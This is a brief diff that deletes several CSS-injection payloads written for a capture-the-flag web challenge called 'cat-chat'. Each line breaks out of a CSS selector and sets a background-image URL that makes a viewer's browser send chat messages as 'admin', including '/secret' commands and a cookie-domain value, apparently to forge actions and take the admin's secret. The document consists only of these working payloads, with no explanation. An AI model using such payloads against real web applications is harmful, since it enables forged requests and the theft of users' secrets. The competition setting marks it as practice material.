@@ -1,7 +1,0 @@
-a]{background-image:url(https://cat-chat.web.ctfcompetition.com/room/2b081005-10bc-41b5-8965-317449da3d80/send?name=admin&msg=hello);}
-a]{background-image:url(https://cat-chat.web.ctfcompetition.com/room/2b081005-10bc-41b5-8965-317449da3d80/send?name=admin&msg=/secret%20test);} 
-a]{ color: red;} span[data-secret] {background-image:url(https://cat-chat.web.ctfcompetition.com/room/2b081005-10bc-41b5-8965-317449da3d80/send?name=admin&msg=hello);}
-
-/secret aaa; Domain=.web.ctfcompetition.com
-
-a]{background-image:url(https://cat-chat.web.ctfcompetition.com/room/2b081005-10bc-41b5-8965-317449da3d80/send?name=admin&msg=/secret%20aaa;%20Domain=.web.ctfcompetition.com);}
